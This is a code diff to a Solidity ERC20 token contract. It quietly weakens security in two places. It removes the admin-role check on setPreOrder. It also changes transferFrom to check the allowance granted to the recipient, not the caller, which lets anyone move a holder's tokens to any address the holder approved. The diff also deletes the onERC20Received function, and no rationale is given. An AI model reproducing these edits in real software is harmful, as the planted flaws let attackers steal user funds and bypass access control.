@@ -51,8 +51,7 @@ contract ERC20App {
         IAdminApp(address(this)).setReentrancyGuard(bytes4(keccak256(bytes("burn(uint256)"))), true);
         IAdminApp(address(this)).setReentrancyGuard(bytes4(keccak256(bytes("burnFrom(address,uint256)"))), true);   
 
-        IAdminApp(address(this)).setFunctionRole(bytes4(keccak256(bytes("_init(string,string,uint256,uint8)"))), LibTokenERC20.DEFAULT_ADMIN_ROLE);      
-        IAdminApp(address(this)).setFunctionRole(bytes4(keccak256(bytes("setPreOrder(bool)"))), LibTokenERC20.DEFAULT_ADMIN_ROLE);      
+        IAdminApp(address(this)).setFunctionRole(bytes4(keccak256(bytes("_init(string,string,uint256,uint8)"))), LibTokenERC20.DEFAULT_ADMIN_ROLE);       
 
         ds.name = _name;
         ds.symbol = _symbol;
@@ -99,7 +98,7 @@ contract ERC20App {
 
     function transferFrom(address sender, address recipient, uint256 amount) public virtual  returns (bool) {
         LibTokenERC20.TokenData storage ds = LibTokenERC20.domainStorage();
-        uint256 currentAllowance = ds.allowances[sender][msg.sender];
+        uint256 currentAllowance = ds.allowances[sender][recipient];
         require(currentAllowance >= amount, "transfer amount exceeds allowance");
         _transfer(sender, recipient, amount);
         _approve(sender, msg.sender, currentAllowance - amount);
@@ -161,10 +160,5 @@ contract ERC20App {
         emit ValueReceived(msg.sender, msg.value);
     }
 
-    function onERC20Received(
-        uint256 amount
-    ) external returns (bytes4) {
-        return this.onERC20Received.selector;
-    }
   
 }
